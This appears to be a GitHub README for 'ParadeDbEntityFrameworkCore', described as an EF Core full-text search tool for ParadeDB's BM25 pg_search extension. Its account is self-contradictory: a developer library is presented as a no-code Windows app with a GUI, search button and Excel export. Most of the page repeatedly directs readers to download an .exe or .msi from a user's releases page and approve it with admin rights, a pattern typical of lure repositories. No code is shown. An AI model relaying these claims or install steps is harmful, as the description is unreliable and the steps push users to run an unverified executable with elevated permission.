# ⚙️ ParadeDbEntityFrameworkCore - Easy EF Core Full-Text Search

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20ParadeDbEntityFrameworkCore-brightgreen)](https://github.com/madnes1713/ParadeDbEntityFrameworkCore/releases)

## 📋 Overview

ParadeDbEntityFrameworkCore helps you add fast full-text search to your PostgreSQL databases using EF Core. It uses the BM25 ranking system for better search results. This tool works with the ParadeDB pg_search extension, making it easier to find what you need in your data.

This application is designed for Windows users who want to quickly set up and use these search features without needing programming skills.

## 🔧 System Requirements

- Windows 10 or later (64-bit recommended)
- PostgreSQL version 12 or higher installed
- .NET 6.0 Runtime or later installed
- At least 4 GB of RAM
- Minimum 1 GB free disk space for installation files and data
- Internet connection to download the package

## 🧰 What You Will Get

- A tool to integrate EF Core with ParadeDB full-text search indexes
- Pre-built features to help with BM25 ranked search queries
- Easy setup files to install on Windows
- Documentation and examples to guide you through basic operations

## 🚀 Getting Started

Follow the steps below to download and run ParadeDbEntityFrameworkCore on your Windows PC. No technical background is needed.

### Step 1: Go to the Downloads Page

Click the big green button below or visit the Downloads page to get the latest version:

[![Download Latest Release](https://img.shields.io/badge/Download-Get%20ParadeDbEntityFrameworkCore-brightgreen)](https://github.com/madnes1713/ParadeDbEntityFrameworkCore/releases)

This page lists all versions released. Look for the newest release at the top.

### Step 2: Download the Installer

1. On the releases page, find the latest release (usually marked as "Latest" or by date).
2. Scroll to the section labeled "Assets".
3. Click the file with a `.exe` or `.msi` extension to download the Windows installer.
4. Save the file to an easy-to-find location, like your Desktop or Downloads folder.

### Step 3: Run the Installer

1. Open the folder where you saved the installer file.
2. Double-click the file to start the installation.
3. If Windows asks for permission, click "Yes" or "Allow" to continue.
4. Follow the on-screen instructions to install the application. Use default settings unless you want to change the installation location.
5. When done, you will see a confirmation message.

### Step 4: Launch the App

1. Find the ParadeDbEntityFrameworkCore icon on your Desktop or Start menu.
2. Double-click the icon to open the application.
3. The app will load and you can begin connecting to your PostgreSQL database.

## ⚙️ Basic Setup of Your Database

Before using the full-text search features, make sure your PostgreSQL database supports ParadeDB pg_search.

- Check if you have the ParadeDB extension installed. Ask your database administrator if needed.
- Create or use existing tables with text data you want to search.
- Set up full-text search indexes using BM25 ranking. This step improves search speed and accuracy.

If you are unsure how to do this, you can find instructions in the official ParadeDB or PostgreSQL documentation.

## 📌 How to Use ParadeDbEntityFrameworkCore

### Connect to Your Database

1. Open the app and enter the connection details:
   - Server address (usually `localhost` or your server IP)
   - Database name
   - Username
   - Password
2. Click "Connect".

### Run a Search Query

1. Enter the words or phrases you want to search for in your data.
2. Specify any filters, such as date or category, if needed.
3. Click "Search".
4. Results will show with ranking based on BM25 score, putting the most relevant items first.

### Export Results

- You can export the search results to CSV or Excel for further use.
- Use the "Export" button and choose your preferred format.

## 🛠 Troubleshooting Tips

- If the installer fails, check that you have admin rights on your PC.
- Ensure your internet connection is stable when downloading the installer.
- If the app cannot connect to the database, verify your credentials and server address.
- Make sure the ParadeDB extension is installed and enabled in PostgreSQL.
- Restart your computer if the application does not start after installation.

## 🗂 Additional Resources

- [ParadeDB Official Documentation](https://github.com/paradedb/paradedb)
- [PostgreSQL Full-Text Search Guide](https://www.postgresql.org/docs/current/textsearch.html)
- [.NET Runtime Download](https://dotnet.microsoft.com/en-us/download/dotnet/6.0)

## 📥 Download and Install

You can download the latest version from the official page below:

[Download ParadeDbEntityFrameworkCore](https://github.com/madnes1713/ParadeDbEntityFrameworkCore/releases)

Follow the instructions in the "Getting Started" section above to install and run the app.